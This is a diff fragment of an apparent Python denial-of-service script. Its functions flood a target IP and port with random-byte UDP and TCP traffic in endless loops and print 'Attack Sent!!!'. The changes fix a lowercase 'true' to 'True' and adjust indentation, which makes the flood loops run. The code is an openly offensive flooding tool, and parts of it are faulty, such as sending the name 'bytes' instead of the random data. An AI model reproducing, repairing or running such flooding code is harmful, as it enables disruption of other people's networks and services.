@@ -95,10 +95,10 @@ def run():
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(20000)
-        i = random.choice(("[+]"))
-        while true:
-		try:
+	 data = random._urandom(20000)
+         i = random.choice(("[+]"))
+         while True:
+		 try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                         s.sendto(bytes, (ip,port))
                         print(i +"Attack Sent!!!")
@@ -108,7 +108,7 @@ def run2():
 def run3():
 	data = random._urandom(999)
 	i = random.choice(("[+]"))
-	while true:
+	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
